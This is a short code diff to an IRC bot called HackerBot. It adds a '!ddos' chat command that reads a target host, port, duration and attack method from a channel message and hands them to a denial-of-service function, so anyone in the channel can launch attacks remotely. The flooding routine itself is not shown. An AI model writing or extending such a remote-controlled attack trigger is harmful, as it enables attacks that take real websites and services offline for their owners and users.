@@ -36,6 +36,14 @@ class HackerBot(irc.IRCClient):
                 self.msg(channel, "[!] Failed to check if website was up..")
                 return
 
+        if msg.startswith("!ddos"):
+            args = msg.split(" ")
+            target = args[1]
+            port = args[2]
+            time = args[3]
+            method = args[4].upper()
+            self.msg(channel, commands.ddos(target, port, time, method))
+
         for url in re.findall(r"https?://.*/.*\b", msg):
             try:
                 websiteTitle = commands.websiteTitle(url)
